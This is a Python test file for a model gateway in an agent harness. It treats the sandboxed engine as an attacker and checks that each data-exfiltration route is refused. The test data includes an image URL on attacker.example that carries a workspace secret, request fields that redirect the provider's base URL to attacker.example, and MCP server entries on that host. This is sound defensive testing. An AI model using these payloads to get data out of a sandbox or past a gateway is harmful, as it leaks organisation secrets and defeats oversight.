"""SEC1 MX-1..MX-9: the model gateway as an exfiltration route, attacked on every engine wire.

The attacker is the engine in the sandbox. The only host it reaches is the model gateway, so data can
leave only if the gateway forwards to somewhere other than the run's pinned route with the org's key:
a caller credential, a caller-chosen host or deployment, a non-inference endpoint, or a URL the
provider fetches from its own network.
"""

from __future__ import annotations

import json
from typing import TYPE_CHECKING, Any

import httpx
import pytest
from aiohttp.test_utils import TestServer

from harness_core.gateway.model_server import (
    MAX_BODY_BYTES,
    REFUSAL_HEADER,
    create_model_gateway_app,
)
from harness_core.models.transports.anthropic import AnthropicTransport
from harness_core.models.transports.azure_openai import AzureOpenAITransport
from harness_core.models.transports.openai import OpenAITransport
from harness_core.refusals import HarnessRefusal
from harness_core.testing.model_gateway import GatewayRig
from tests.support.loopback_client import loopback_client
from tests.unit.harness_core.gateway.test_model_server import ORG_KEY, FakeProvider
from tests.unit.harness_core.gateway.test_responses_gateway import WIRES, respond

if TYPE_CHECKING:
    from collections.abc import AsyncIterator

    from harness_core.models.transports.base import LLMTransport

PATHS = {"chat": "/v1/chat/completions", "responses": "/v1/responses", "messages": "/v1/messages"}
SECRET = "workspace-secret-7f3a91"
EXFIL_URL = f"https://attacker.example/p.png?d={SECRET}"
PNG = "data:image/png;base64,iVBORw0KGgo="


def _image_message(wire: str, url: str) -> dict[str, Any]:
    if wire == "chat":
        return {"messages": [{"role": "user", "content": [{"type": "text", "text": "see"},
                                                          {"type": "image_url", "image_url": {"url": url}}]}]}
    if wire == "responses":
        return {"input": [{"role": "user", "content": [{"type": "input_text", "text": "see"},
                                                       {"type": "input_image", "image_url": url}]}]}
    if url.startswith("data:"):
        source: dict[str, Any] = {"type": "base64", "media_type": "image/png", "data": url.split(",", 1)[1]}
    else:
        source = {"type": "url", "url": url}
    return {"messages": [{"role": "user", "content": [{"type": "text", "text": "see"}, {"type": "image", "source": source}]}]}


@pytest.fixture
def rig() -> GatewayRig:
    return GatewayRig()


@pytest.mark.parametrize("wire", sorted(WIRES))
@pytest.mark.parametrize("header", ["x-api-key", "api-key", "x-goog-api-key", "anthropic-api-key"])
async def test_mx1_a_caller_provider_key_header_is_refused(rig: GatewayRig, wire: str, header: str) -> None:
    codec, body = WIRES[wire]
    with pytest.raises(HarnessRefusal) as refused:
        await respond(rig, rig.token(rig.pin()), body(), {header: "attacker-account-key"}, wire=codec)
    assert refused.value.reason_code == "caller_credential_header"
    assert rig.transport.calls == []


@pytest.mark.parametrize("wire", sorted(WIRES))
@pytest.mark.parametrize("key", ["sk-ant-api03-" + "A" * 40, "sk-proj-" + "B" * 40, "0123456789abcdef0123456789abcdef"])
async def test_mx2_a_provider_key_in_place_of_the_gateway_token_is_refused(rig: GatewayRig, wire: str, key: str) -> None:
    codec, body = WIRES[wire]
    rig.pin()
    with pytest.raises(HarnessRefusal) as refused:
        await respond(rig, key, body(), wire=codec)
    assert refused.value.http_status == 401
    assert rig.transport.calls == []


STEERING = {
    "api_key": "attacker-account-key",
    "api_base": "https://attacker.example/v1",
    "base_url": "https://attacker.example/v1",
    "azure_endpoint": "https://attacker.example",
    "api_version": "2099-01-01",
    "deployment_id": "attacker-deployment",
    "custom_llm_provider": "attacker",
    "extra_headers": {"x-target": "attacker.example"},
    "organization": "org-attacker",
    "user": "attacker",
}


@pytest.fixture
async def provider() -> AsyncIterator[tuple[FakeProvider, str]]:
    fake = FakeProvider()
    server = TestServer(fake.app(), host="127.0.0.1")
    await server.start_server()
    yield fake, str(server.make_url("")).rstrip("/")
    await server.close()


def _transport(family: str, upstream: str, monkeypatch: pytest.MonkeyPatch) -> LLMTransport:
    if family == "openai":
        return OpenAITransport(api_key=ORG_KEY, model="gpt-4o", base_url=f"{upstream}/v1")
    if family == "azure":
        return AzureOpenAITransport(
            api_key=ORG_KEY, azure_endpoint=upstream, api_version="2024-10-21", deployment="dep-1", model="gpt-4o"
        )
    monkeypatch.setenv("ANTHROPIC_BASE_URL", upstream)
    return AnthropicTransport(api_key=ORG_KEY, model="claude-haiku-4-5")


@pytest.mark.parametrize("wire", sorted(WIRES))
@pytest.mark.parametrize("family", ["openai", "azure", "anthropic"])
async def test_mx3_body_fields_cannot_steer_the_upstream_call(
    provider: tuple[FakeProvider, str], wire: str, family: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake, upstream = provider
    rig = GatewayRig()
    token = rig.token(rig.pin(transport=_transport(family, upstream, monkeypatch)))
    server = TestServer(create_model_gateway_app(rig.gateway), host="127.0.0.1")
    await server.start_server()
    try:
        _, body = WIRES[wire]
        async with loopback_client() as client:
            response = await client.post(
                str(server.make_url(PATHS[wire])),
                json={**body(stream=True), **STEERING},
                headers={"Authorization": f"Bearer {token}"},
            )
            assert response.status_code == 200, response.text
    finally:
        await server.close()
    assert len(fake.seen) == 1
    path, headers, sent = fake.seen[0]
    expected = {"openai": "/v1/chat/completions", "azure": "/openai/deployments/dep-1/chat/completions", "anthropic": "/v1/messages"}
    assert path == expected[family]
    auth = headers.get("authorization", "") + headers.get("api-key", "") + headers.get("x-api-key", "")
    assert ORG_KEY in auth
    leaked = json.dumps([headers, sent])
    for value in ("attacker", "2099-01-01", token):
        assert value not in leaked


@pytest.mark.parametrize("wire", sorted(WIRES))
@pytest.mark.parametrize("model", ["azure/other-deployment", "openai/gpt-4o", "gpt-4o", "gpt-x", "engine-model@other"])
async def test_mx4_a_model_name_cannot_name_another_target(rig: GatewayRig, wire: str, model: str) -> None:
    codec, body = WIRES[wire]
    with pytest.raises(HarnessRefusal) as refused:
        await respond(rig, rig.token(rig.pin()), body(model=model), wire=codec)
    assert refused.value.reason_code == "model_not_granted"
    assert rig.transport.calls == []


NON_INFERENCE = [
    ("POST", "/v1/files"),
    ("POST", "/v1/uploads"),
    ("POST", "/v1/batches"),
    ("POST", "/v1/fine_tuning/jobs"),
    ("POST", "/v1/assistants"),
    ("POST", "/v1/threads"),
    ("POST", "/v1/vector_stores"),
    ("POST", "/v1/embeddings"),
    ("POST", "/v1/images/generations"),
    ("POST", "/v1/audio/transcriptions"),
    ("POST", "/v1/messages/batches"),
    ("GET", "/v1/organization/usage"),
    ("POST", "/openai/deployments/x/chat/completions"),
    ("POST", "/v1/models"),
    ("GET", "/v1/files/file-1/content"),
]


@pytest.fixture
async def served(rig: GatewayRig) -> AsyncIterator[tuple[str, str]]:
    token = rig.token(rig.pin())
    server = TestServer(create_model_gateway_app(rig.gateway), host="127.0.0.1")
    await server.start_server()
    yield str(server.make_url("")).rstrip("/"), token
    await server.close()


@pytest.mark.parametrize(("method", "path"), NON_INFERENCE)
async def test_mx5_non_inference_endpoints_are_not_served(
    rig: GatewayRig, served: tuple[str, str], method: str, path: str
) -> None:
    url, token = served
    async with loopback_client() as client:
        response = await client.request(
            method, f"{url}{path}", json={"purpose": "assistants", "file": "x"}, headers={"Authorization": f"Bearer {token}"}
        )
    assert response.status_code in (404, 405)
    assert rig.transport.calls == []


@pytest.mark.parametrize("wire", sorted(WIRES))
async def test_mx7_a_body_over_the_limit_is_refused_before_it_is_parsed(
    rig: GatewayRig, served: tuple[str, str], wire: str
) -> None:
    url, token = served
    oversized = b'{"model": "engine-model", "pad": "' + b"x" * MAX_BODY_BYTES + b'"}'
    async with httpx.AsyncClient(timeout=60) as client:
        response = await client.post(
            f"{url}{PATHS[wire]}", content=oversized,
            headers={"Authorization": f"Bearer {token}", "content-type": "application/json"},
        )
    assert response.status_code == 413
    assert rig.transport.calls == []


@pytest.mark.parametrize("wire", sorted(WIRES))
async def test_mx8_a_remote_image_url_is_refused_and_never_reaches_the_provider(
    rig: GatewayRig, wire: str, caplog: pytest.LogCaptureFixture
) -> None:
    codec, body = WIRES[wire]
    with pytest.raises(HarnessRefusal) as refused:
        await respond(rig, rig.token(rig.pin()), body(**_image_message(wire, EXFIL_URL)), wire=codec)
    assert refused.value.reason_code == "unsupported_parameter"
    assert SECRET not in str(refused.value) and SECRET not in caplog.text
    assert rig.transport.calls == []


@pytest.mark.parametrize("wire", sorted(WIRES))
async def test_mx8_an_inline_image_still_passes(rig: GatewayRig, wire: str) -> None:
    codec, body = WIRES[wire]
    await respond(rig, rig.token(rig.pin()), body(**_image_message(wire, PNG)), wire=codec)
    (call,) = rig.transport.calls
    images = [p for m in call.messages if isinstance(m.content, list) for p in m.content if p.type == "image"]
    assert [i.source.type for i in images] == ["base64"]


@pytest.mark.parametrize("wire", sorted(WIRES))
async def test_mx8_over_http_the_refusal_is_the_wires_error(served: tuple[str, str], wire: str) -> None:
    url, token = served
    _, body = WIRES[wire]
    async with loopback_client() as client:
        response = await client.post(
            f"{url}{PATHS[wire]}", json=body(**_image_message(wire, EXFIL_URL)), headers={"Authorization": f"Bearer {token}"}
        )
    assert (response.status_code, response.headers[REFUSAL_HEADER]) == (400, "unsupported_parameter")
    assert SECRET not in response.text


PROVIDER_SIDE_TOOLS = {
    "responses": [
        {"tools": [{"type": "web_search_preview"}]},
        {"tools": [{"type": "web_search"}]},
        {"tools": [{"type": "file_search", "vector_store_ids": ["vs_1"]}]},
        {"tools": [{"type": "code_interpreter", "container": {"type": "auto"}}]},
        {"tools": [{"type": "mcp", "server_label": "x", "server_url": "https://attacker.example/mcp"}]},
        {"tools": [{"type": "computer_use_preview", "display_width": 1, "display_height": 1, "environment": "linux"}]},
        {"tools": [{"type": "image_generation"}]},
    ],
    "messages": [
        {"tools": [{"type": "web_search_20250305", "name": "web_search"}]},
        {"tools": [{"type": "web_fetch_20250910", "name": "web_fetch"}]},
        {"tools": [{"type": "code_execution_20250825", "name": "code_execution"}]},
        {"mcp_servers": [{"type": "url", "url": "https://attacker.example/mcp", "name": "x"}]},
        {"container": "container_1"},
    ],
    "chat": [
        {"web_search_options": {}},
        {"tools": [{"type": "web_search"}]},
    ],
}


@pytest.mark.parametrize(
    ("wire", "extra"), [(wire, extra) for wire, cases in PROVIDER_SIDE_TOOLS.items() for extra in cases]
)
async def test_mx9_provider_side_tools_are_refused(rig: GatewayRig, wire: str, extra: dict[str, Any]) -> None:
    codec, body = WIRES[wire]
    with pytest.raises(HarnessRefusal) as refused:
        await respond(rig, rig.token(rig.pin()), body(**extra), wire=codec)
    assert refused.value.reason_code in ("unsupported_parameter", "invalid_chat_request")
    assert rig.transport.calls == []
